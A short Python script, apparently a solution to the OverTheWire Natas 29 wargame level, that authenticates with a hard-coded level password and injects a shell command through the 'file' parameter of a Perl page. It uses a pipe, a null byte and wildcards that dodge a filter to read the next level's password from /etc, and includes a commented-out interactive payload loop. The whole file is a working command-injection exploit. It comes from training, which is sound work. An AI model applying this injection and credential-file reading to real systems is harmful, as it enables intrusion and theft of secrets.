import requests, urllib.parse,re, readline

URL = "http://natas29.natas.labs.overthewire.org/index.pl?file="
USERNAME = "natas29"
PASSWORD = "airooCaiseiyee8he8xongien9euhe8b"

s = requests.Session()
s.auth = (USERNAME, PASSWORD)

# while True:
#     payload = input("payload: ")
#     readline.insert_text(payload)
#     payload = urllib.parse.quote_plus(payload)
#     r = s.get(URL+f"|{payload}%00")
#     fltr = r.text[1668:]
#     print(fltr)

r = s.get(URL+"|cat /etc/*atas_webpass/*atas30%00")
fltr = r.text[1668:]
print(fltr)
